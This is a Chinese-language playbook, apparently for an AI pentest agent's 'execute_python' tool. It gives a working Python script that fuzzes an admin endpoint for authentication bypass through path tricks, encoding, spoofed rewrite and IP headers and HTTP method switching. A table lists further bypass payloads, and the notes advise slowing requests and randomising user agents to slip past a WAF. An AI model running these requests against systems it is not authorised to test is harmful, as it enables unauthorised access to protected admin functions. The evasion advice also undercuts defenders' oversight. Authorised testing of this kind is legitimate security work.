# 鉴权绕过 Fuzz Playbook

替代 MCP 工具 `recon_fuzz_auth_bypass`。用 `execute_python` + requests 发变种请求。
封装工具固定 4 参数，脚本可自由组合绕过技巧（对应 A01 访问控制 / A07 身份认证）。

## 依赖
- requests

## 脚本
```python
import requests

target = "https://target/admin"
base = target.rstrip("/")

variants = [
    ("path_dot",      base + "/."),
    ("path_slash",    base + "/"),
    ("path_case",     base.replace("/admin", "/Admin")),
    ("path_prefix",   base.replace("/admin", "/public/../admin")),
    ("path_encoded",  base.replace("/admin", "/%61dmin")),
    ("header_orig",   base),         # + X-Original-URL: /admin
    ("header_rewrite", base),        # + X-Rewrite-URL: /admin
]

for name, u in variants:
    headers = {}
    if name == "header_orig":
        headers["X-Original-URL"] = "/admin"
    if name == "header_rewrite":
        headers["X-Rewrite-URL"] = "/admin"
    for m in ("GET", "POST", "PUT", "HEAD", "PATCH"):
        try:
            r = requests.request(m, u, headers=headers, verify=False,
                                 timeout=10, allow_redirects=False)
        except Exception as e:
            print(f"[{name}/{m}] ERR {e}")
            continue
        # 原本 401/403 → 200/302 即潜在绕过
        if r.status_code in (200, 302, 301) and r.status_code != 401:
            loc = r.headers.get("Location", "")
            print(f"[{name}/{m}] {r.status_code} len={len(r.text)} loc={loc[:50]}")
```

## 绕过技巧清单
| 类别 | 技巧 |
|---|---|
| 路径变种 | `/admin`、`/admin/`、`/admin/.`、`/admin;`、`/./admin`、`/admin%2f`、`/admin%09` |
| 大小写 | `/Admin`、`/ADMIN`、`/aDmIn` |
| 编码 | URL 编码 `/%61dmin`、双重编码 `%2561dmin` |
| 头注入 | `X-Original-URL`、`X-Rewrite-URL`、`X-Forwarded-For`、`X-Custom-IP-Authorization: 127.0.0.1` |
| 方法变换 | GET → POST / PUT / PATCH / HEAD |
| 参数注入 | `?admin=1`、`?role=admin`、`?debug=1`、`?token=` |
| 路径前缀 | `/public/../admin`、`/static/../admin` |

## 判读
- 原本 `401/403` → `200/302` 即绕过成功
- 注意区分降级到登录页（`302 → /login`，通常不是绕过）与真实绕过（`200` 含管理内容）
- 比对响应大小：与 401 基准不同才有意义

## 注意
- 每个变体都保留原始请求做对照，避免误判
- WAF 存在时降低频率并加随机 UA
- 命中后用 `proxy_replay_flow` 或再次 requests 复现取证
